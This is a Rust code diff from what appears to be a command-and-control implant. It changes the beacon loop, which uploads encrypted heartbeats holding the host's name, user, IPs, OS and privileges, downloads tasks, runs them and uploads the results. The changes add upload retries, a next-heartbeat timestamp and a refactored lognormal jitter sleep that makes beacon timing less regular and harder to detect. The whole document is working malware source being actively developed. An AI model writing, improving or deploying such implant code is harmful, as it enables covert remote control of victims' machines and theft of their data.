@@ -561,10 +561,15 @@ pub(crate) fn run_loop(
             continue;
         }
 
+        // Pre-compute jitter sleep for this iteration; used both for the
+        // next_hb_at hint in the heartbeat and for the actual sleep.
+        let sleep_secs = compute_sleep_secs(state);
+
         rl_log!("building heartbeat");
         let op_cwd = state.operator_cwd.lock().unwrap().clone();
         let hb_seq = state.hb_seq.fetch_add(1, std::sync::atomic::Ordering::Relaxed) + 1;
-        let heartbeat = build_heartbeat(info, start_cwd, &op_cwd, blob, hb_seq);
+        let next_hb_at = unix_now() + sleep_secs;
+        let heartbeat = build_heartbeat(info, start_cwd, &op_cwd, blob, hb_seq, next_hb_at);
         rl_log!("encrypting heartbeat");
         if let Some(enc) = crypto::encrypt_heartbeat(&heartbeat, pub_key) {
             rl_log!("uploading heartbeat");
@@ -584,7 +589,7 @@ pub(crate) fn run_loop(
         }
         let raw = match transport.download(&input_path) {
             Some(b) => b,
-            None    => { rl_log!("download=None, jitter_sleep"); jitter_sleep(state); rl_log!("jitter_sleep done"); continue; }
+            None    => { rl_log!("download=None, jitter_sleep"); std::thread::sleep(Duration::from_secs(sleep_secs)); rl_log!("jitter_sleep done"); continue; }
         };
         #[cfg(windows)]
         unsafe {
@@ -594,12 +599,12 @@ pub(crate) fn run_loop(
         }
         rl_log!("download ok");
 
-        if raw == b"MZ" || raw.is_empty() { rl_log!("raw=MZ/empty, jitter_sleep"); jitter_sleep(state); rl_log!("jitter_sleep done"); continue; }
+        if raw == b"MZ" || raw.is_empty() { rl_log!("raw=MZ/empty, jitter_sleep"); std::thread::sleep(Duration::from_secs(sleep_secs)); rl_log!("jitter_sleep done"); continue; }
 
         rl_log!("parsing raw");
         let raw_str = match std::str::from_utf8(&raw) {
             Ok(s)  => s.trim().to_string(),
-            Err(_) => { rl_log!("utf8 err, jitter_sleep"); jitter_sleep(state); rl_log!("jitter_sleep done"); continue; }
+            Err(_) => { rl_log!("utf8 err, jitter_sleep"); std::thread::sleep(Duration::from_secs(sleep_secs)); rl_log!("jitter_sleep done"); continue; }
         };
 
         #[cfg(windows)]
@@ -619,7 +624,7 @@ pub(crate) fn run_loop(
                 if let Some(enc) = crypto::encrypt_heartbeat(&km, pub_key) {
                     transport.upload(&format!("{}{}", folder, hb_f), enc.as_bytes());
                 }
-                jitter_sleep(state);
+                std::thread::sleep(Duration::from_secs(sleep_secs));
                 continue;
             }
         };
@@ -629,7 +634,7 @@ pub(crate) fn run_loop(
             if unix_now() as f64 > exp {
                 rl_log!("task expired");
                 transport.upload(&input_path, b"MZ");
-                jitter_sleep(state);
+                std::thread::sleep(Duration::from_secs(sleep_secs));
                 continue;
             }
         }
@@ -641,13 +646,22 @@ pub(crate) fn run_loop(
             OutputDebugStringA(msg.as_ptr());
         }
         rl_log!("dispatching task");
-        match exec::dispatch(&task, state, transport) {
+        match exec::dispatch(&task, state, transport, session_key) {
             Some(resp) => {
                 rl_log!("dispatch ok, encrypting response");
                 match crypto::encrypt_response(&resp, pub_key) {
                     Some(enc) => {
                         rl_log!("encrypt ok, uploading response");
-                        let up = transport.upload(&format!("{}{}", folder, output_f), enc.as_bytes());
+                        let output_path_full = format!("{}{}", folder, output_f);
+                        let enc_bytes = enc.as_bytes();
+                        let mut up = transport.upload(&output_path_full, enc_bytes);
+                        // Retry up to 2 times on upload failure
+                        for attempt in 1..=2 {
+                            if up { break; }
+                            rl_log!("output upload retry");
+                            std::thread::sleep(Duration::from_secs(2 * attempt));
+                            up = transport.upload(&output_path_full, enc_bytes);
+                        }
                         #[cfg(windows)]
                         unsafe {
                             extern "system" { fn OutputDebugStringA(s: *const u8); }
@@ -668,7 +682,7 @@ pub(crate) fn run_loop(
         }
 
         rl_log!("jitter_sleep post-dispatch");
-        jitter_sleep(state);
+        std::thread::sleep(Duration::from_secs(sleep_secs));
         rl_log!("jitter_sleep done");
     }
     rl_log!("loop exited");
@@ -682,6 +696,7 @@ fn build_heartbeat(
     op_cwd:    &str,
     blob:      &str,
     seq:       u64,
+    next_hb_at: u64,
 ) -> String {
     #[cfg(windows)]
     macro_rules! bh_log {
@@ -699,7 +714,7 @@ fn build_heartbeat(
     bh_log!("format");
     let san = |s: &str| s.replace('|', "_");
     let r = format!(
-        "{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}",
+        "{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}",
         unix_now(),
         san(&info.hostname), san(&info.username), san(&info.ip_int), san(&info.os),
         san(&info.privs), san(start_cwd), san(op_cwd), san(&info.ip_ext),
@@ -707,6 +722,7 @@ fn build_heartbeat(
         san(blob_field),
         san(&expanded_s),
         seq,
+        next_hb_at,
     );
     bh_log!("done");
     r
@@ -719,38 +735,27 @@ pub fn unix_now() -> u64 {
         .unwrap_or(0)
 }
 
-pub(crate) fn jitter_sleep(state: &Arc<exec::AgentState>) {
-    #[cfg(all(windows, stratum_debug))]
-    macro_rules! js_log {
-        ($s:literal) => { unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(concat!("[JS] ", $s, "\0").as_ptr()); } }
-    }
-    #[cfg(all(not(windows), stratum_debug))]
-    macro_rules! js_log { ($s:literal) => { eprintln!("[JS] {}", $s); } }
-    #[cfg(not(stratum_debug))]
-    macro_rules! js_log { ($s:literal) => {}; }
-
-    js_log!("enter");
+/// Compute the jittered sleep duration (seconds) without actually sleeping.
+pub(crate) fn compute_sleep_secs(state: &Arc<exec::AgentState>) -> u64 {
     use std::sync::atomic::Ordering;
     use rand_distr::{Distribution, LogNormal};
-    js_log!("loading base");
     let base   = state.base_sleep.load(Ordering::Relaxed) as f64;
     let jitter = state.jitter_pct.load(Ordering::Relaxed) as f64;
-    js_log!("computing sleep");
     let secs = if jitter > 0.0 {
         let sigma  = (jitter / 100.0).max(0.01);
         let mu     = base.ln() - sigma * sigma / 2.0;
-        js_log!("LogNormal::new");
         let ln     = LogNormal::new(mu, sigma).unwrap_or_else(|_| {
             LogNormal::new(base.ln(), 0.1).unwrap()
         });
-        js_log!("ln.sample");
         ln.sample(&mut rand::thread_rng())
     } else {
         base
     };
-    js_log!("sleeping");
-    std::thread::sleep(Duration::from_secs((secs as u64).max(5)));
-    js_log!("awake");
+    (secs as u64).max(5)
+}
+
+pub(crate) fn jitter_sleep(state: &Arc<exec::AgentState>) {
+    std::thread::sleep(Duration::from_secs(compute_sleep_secs(state)));
 }
 
 pub(crate) fn in_window(start: &str, end: &str) -> bool {
